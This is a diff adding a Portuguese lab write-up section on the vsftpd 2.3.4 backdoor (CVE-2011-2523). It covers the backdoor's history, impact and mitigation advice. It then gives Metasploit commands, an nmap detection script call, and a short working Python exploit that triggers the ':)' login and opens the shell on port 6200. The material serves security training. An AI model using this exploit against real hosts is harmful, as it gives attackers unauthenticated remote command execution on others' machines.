@@ -320,4 +320,111 @@ Resultado:
 <br>Coisa mais linda :D :D :D Até um telnet aberto... 
 <br>Varias portas para treinarmos e testamos forte...
 
+---
+
+##### Analise de Servico Identificado com Nmap
+
+**Servico:** vsftpd  
+**Versao:** 2.3.4
+
+---
+
+###### CVE Relacionado: CVE-2011-2523
+
+###### Historinha... 
+
+O atacante modificou o código-fonte da versão 2.3.4, inserindo um backdoor deliberado.
+
+Esse código malicioso não estava presente no repositório oficial de desenvolvimento, apenas na cópia que foi publicada para download no site principal.
+
+O backdoor permanecia inativo até que um login contendo :) fosse feito via FTP.
+
+Ao detectar esse login especial, o serviço abria uma shell de comando na porta 6200, permitindo acesso remoto ao sistema.
+
+###### Detalhes
+
+- Não era ativado por padrão, apenas em condições específicas.
+- Permitia execução de comandos no sistema.
+- Foi incluído sem o conhecimento ou consentimento do desenvolvedor original.
+- Detectado rapidamente pela comunidade e removido.
+
+###### Impacto
+
+- Execucao de comandos no sistema alvo sem autenticacao
+- Comprometimento total da maquina
+- Acesso remoto como root (dependendo da configuracao)
+
+###### Reação do desenvolvedor
+
+- Chris Evans, criador do vsftpd, publicou um alerta explicando a situação e denunciou o comprometimento da integridade do servidor de distribuição:
+
+###### Fontes Adicionais
+
+- CVE detalhado: https://nvd.nist.gov/vuln/detail/CVE-2011-2523  
+- Debian Security Tracker: https://security-tracker.debian.org/tracker/CVE-2011-2523  
+- GitHub com script: https://github.com/nobodyatall648/CVE-2011-2523
+
+###### Recomendacoes
+
+- Atualizar o vsftpd para uma versao posterior
+- Bloquear a porta 6200 caso detectada
+- Substituir FTP por SFTP ou FTPS
+- Monitorar logs de conexao na porta 21
+
+---
+
+##### Exploracao com Metasploit
+
+```bash
+msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOSTS <IP_DO_ALVO>
+run
+```
+![image](https://github.com/user-attachments/assets/7b37d6f6-c203-4c2a-b415-519cbace4e92)
+
+Facil assim como a vida deve ser...
+
+**Referencia:**  
+https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/
+
+---
+
+###### Verificacao com Nmap
+
+```bash
+nmap --script ftp-vsftpd-backdoor -p 21 <IP_DO_ALVO>
+```
+![image](https://github.com/user-attachments/assets/2be7fb48-9b83-435a-8e95-742996d256d2)
+
+**Referencia do script:**  
+https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html
+
+---
+
+###### Exploit Manual (Python)
+
+```python
+from telnetlib import Telnet
+
+host = "192.168.0.10"
+tn = Telnet(host, 21)
+tn.read_until(b"(vsFTPd 2.3.4)")
+tn.write(b"USER test:)
+")
+tn.write(b"PASS test
+")
+
+shell = Telnet(host, 6200)
+shell.interact()
+```
+
+**Exploit DB:**  
+https://www.exploit-db.com/exploits/49757
+
+---
+
+
+
+
 
